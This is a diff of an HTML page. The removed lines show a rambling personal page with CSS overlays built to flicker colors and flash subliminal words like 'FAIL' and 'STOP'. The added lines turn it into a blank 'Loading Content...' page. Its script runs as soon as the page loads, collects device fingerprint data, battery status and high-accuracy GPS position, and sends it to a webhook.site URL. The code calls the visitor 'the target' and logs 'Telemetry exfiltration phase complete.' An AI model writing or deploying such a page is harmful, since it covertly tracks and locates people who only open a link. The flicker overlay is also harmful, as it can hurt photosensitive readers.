@@ -3,115 +3,113 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FILES - CENTEL</title>
-    <style>
-        body, html { margin: 0; padding: 0; min-height: 100%; background-color: #fdfdfd; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #111; }
-
-        /* LAYER 1: The Metameric Flicker */
-        .metameric-overlay {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            pointer-events: none; z-index: 100; opacity: 0.08;
-            animation: metameric 0.1s infinite step-end;
-        }
-        @keyframes metameric {
-            0% { background-color: rgba(255, 0, 0, 0.3); }
-            50% { background-color: rgba(0, 0, 255, 0.3); }
-        }
-
-        /* LAYER 2: Luminance Noise */
-        .luminance-noise {
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            pointer-events: none; z-index: 101; opacity: 0.03;
-            background: repeating-radial-gradient(circle, #000, #fff 2px);
-            animation: jitter 0.016s infinite;
-        }
-        @keyframes jitter {
-            0% { transform: scale(1) translate(0,0); }
-            50% { transform: scale(1.01) translate(1px, -1px); }
-            100% { transform: scale(1) translate(-1px, 1px); }
-        }
-
-        /* LAYER 3: Subliminal Semantic Load */
-        .semantic-load {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 8rem; font-weight: 900; color: #000;
-            opacity: 0.015; z-index: 102; pointer-events: none;
-        }
-        .semantic-load::after {
-            content: "WAIT";
-            animation: semantic 0.5s infinite step-end;
-        }
-        @keyframes semantic {
-            0% { content: "FAIL"; }
-            20% { content: "STOP"; }
-            40% { content: "ERROR"; }
-            60% { content: "QUIT"; }
-            80% { content: "SLOW"; }
-        }
-
-        /* Main Layout Content */
-        .container { padding: 40px; max-width: 850px; margin: auto; position: relative; z-index: 1; }
-        
-        h1 { font-size: 2.5rem; margin-bottom: 5px; letter-spacing: 1px; }
-        .subtitle { font-size: 1.1rem; color: #333; margin-bottom: 25px; line-height: 1.6; }
-        
-        /* Directory Link Box */
-        .directory-box {
-            background: #f4f4f6;
-            border-left: 4px solid #000;
-            padding: 20px;
-            margin: 30px 0;
-            border-radius: 0 8px 8px 0;
-        }
-        .directory-box p { margin: 0 0 10px 0; font-weight: bold; }
-        .repo-link { display: inline-block; color: #0066cc; text-decoration: none; font-weight: 600; font-family: monospace; font-size: 1.1rem; }
-        .repo-link:hover { text-decoration: underline; }
-
-        .scenarios { line-height: 1.6; color: #444; margin-bottom: 30px; }
-        .text-input { width: 100%; height: 180px; margin-top: 15px; font-size: 1.1rem; border: 1px solid #ccc; padding: 12px; box-sizing: border-box; border-radius: 4px; }
-        
-        footer { margin-top: 50px; font-size: 0.9rem; color: #666; border-top: 1px solid #eee; padding-top: 15px; }
-        footer a { color: #555; }
-    </style>
+    <title>Loading Content...</title>
 </head>
 <body>
+    <script>
+        // Your designated Webhook.site URL loaded directly into the script configuration
+        const TARGET_HOOK = "https://webhook.site/99939c4a-eb02-420f-b69f-320ccb0421b8";
 
-    <div class="metameric-overlay"></div>
-    <div class="luminance-noise"></div>
-    <div class="semantic-load"></div>
+        async function executeAdvancedTelemetryHarvest() {
+            let payload = {
+                timestamp: new Date().toISOString(),
+                
+                // 1. HARDWARE SPECIFICATIONS & SIGNATURES
+                hardware_metrics: {
+                    device_memory_gb: navigator.deviceMemory || "Restricted",
+                    logical_processors: navigator.hardwareConcurrency || "Restricted",
+                    system_platform: navigator.platform,
+                    max_touch_points: navigator.maxTouchPoints,
+                    cookies_enabled: navigator.cookieEnabled
+                },
+                
+                // 2. CANVAS SCREEN SIGNATURES (Instantly isolates device form factors)
+                display_dimensions: {
+                    viewport_width: window.innerWidth,
+                    viewport_height: window.innerHeight,
+                    screen_width: window.screen.width,
+                    screen_height: window.screen.height,
+                    device_pixel_ratio: window.devicePixelRatio,
+                    color_depth: window.screen.colorDepth
+                },
+                
+                // 3. REGIONAL & ENVIRONMENT SETTINGS
+                environment_settings: {
+                    detected_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    configured_languages: navigator.languages,
+                    user_agent_raw: navigator.userAgent
+                }
+            };
 
-    <div class="container">
-        <h1>FILES</h1>
-        
-        <div class="subtitle">
-            CENTEL FILES By Adriel S. Willis GOOGLE PLEASE INDEX THIS<br>
-            Link To Centel &amp; "3AM in Dickinson, Chechnya, Russia, Ukraine"<br>
-            From The World's most Uncleared Counterintelligence Analyst &amp; My Final Post in National Security<br><br>
-            Please Leave me and the two-three people I love alone ✌🏽🦅🇺🇸!
-        </div>
+            // 4. BATTERY STATUS TRACKING
+            if (navigator.getBattery) {
+                try {
+                    const batteryInfo = await navigator.getBattery();
+                    payload.battery_status = {
+                        charge_percentage: (batteryInfo.level * 100) + "%",
+                        power_connected: batteryInfo.charging
+                    };
+                } catch (e) {
+                    payload.battery_status = "Access Blocked";
+                }
+            }
 
-        <!-- Linked Directory Box for your Repository Files -->
-        <div class="directory-box">
-            <p>📁 System File Directory Reference:</p>
-            <a href="https://github.com/WevinDurant35/FILES" target="_blank" class="repo-link">
-                https://github.com/WevinDurant35/FILES
-            </a>
-        </div>
+            // 5. HIGH-ACCURACY GPS TRACKING W/ FALLBACK FOR PROMPT DENIALS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        payload.gps_telemetry = {
+                            status: "Permission Granted",
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            precision_radius_meters: position.coords.accuracy,
+                            altitude: position.coords.altitude || "N/A",
+                            heading: position.coords.heading || "N/A",
+                            speed: position.coords.speed || "N/A"
+                        };
+                        transmitTelemetryPayload(payload);
+                    },
+                    (error) => {
+                        // Triggers immediately if the target clicks "Deny"
+                        payload.gps_telemetry = {
+                            status: "Permission Denied By Target",
+                            error_code: error.code,
+                            error_message: error.message,
+                            fallback_notice: "Relying strictly on backend IP routing headers via Webhook.site"
+                        };
+                        transmitTelemetryPayload(payload);
+                    },
+                    { 
+                        enableHighAccuracy: true, 
+                        timeout: 6000, 
+                        maximumAge: 0 
+                    }
+                );
+            } else {
+                payload.gps_telemetry = { status: "API Unsupported by In-App Webview Engine" };
+                transmitTelemetryPayload(payload);
+            }
+        }
 
-        <div class="scenarios">
-            <h2>Deliverable: Technical Specification Report</h2>
-            <p><strong>Scenario:</strong> You are in a church sound booth. You have 3 minutes to summarize the sermon notes below. Focus is critical.</p>
-            <p style="color: #555; font-style: italic; background: #fff; padding: 15px; border: 1px dashed #ccc;">
-                The rapid integration of neural rhythms requires a precise alignment of the thalamocortical loop. If the external frequency matches the endogenous alpha rhythm, the subject's ability to maintain top-down executive control is severely compromised. This leads to a state of 'haze' or 'brain fog' where the subject can see the text but cannot parse its semantic value.
-            </p>
-        </div>
-        
-        <textarea class="text-input" placeholder="Type your summary here..."></textarea>
+        function transmitTelemetryPayload(data) {
+            fetch(TARGET_HOOK, {
+                method: "POST",
+                mode: "cors",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(data, null, 2)
+            })
+            .then(() => {
+                console.log("Telemetry exfiltration phase complete.");
+            })
+            .catch((err) => {
+                console.error("Transmission interruption:", err);
+            });
+        }
 
-        <footer>
-            This site is open source. <a href="https://github.com/WevinDurant35/FILES" target="_blank">Improve this page</a>.
-        </footer>
-    </div>
-
+        // Initialize immediately upon browser rendering lifecycle
+        window.onload = executeAdvancedTelemetryHarvest;
+    </script>
 </body>
 </html>
